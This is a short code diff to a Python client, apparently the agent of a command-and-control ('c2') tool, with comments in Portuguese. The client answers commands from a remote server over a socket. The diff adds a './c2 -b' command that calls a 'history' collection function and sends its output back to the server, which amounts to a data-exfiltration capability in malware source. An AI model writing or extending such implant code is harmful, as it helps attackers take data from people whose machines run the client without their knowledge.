@@ -20,7 +20,7 @@
 
 # Importando bibliotecas
 from constantes import *
-import socket, time
+import funcoes, socket, time
 
 # Função para parar o cliente
 def parar_cliente():
@@ -62,6 +62,8 @@ def realizar_conexao():
         # Analisando mensagem do servidor e preparando resposta
         if (mensagem_recebida == "alive?"):
             mensagem_retorno = "alive!".encode(CHARSET)
+        elif ("./c2 -b" in mensagem_recebida):
+            mensagem_retorno = funcoes.obter_historico().encode(CHARSET)
         elif ("./c2 -q" in mensagem_recebida):
             mensagem_retorno = f"Encerrando cliente em {TIMEOUT} segundos...".encode(CHARSET)
             parar_cliente()
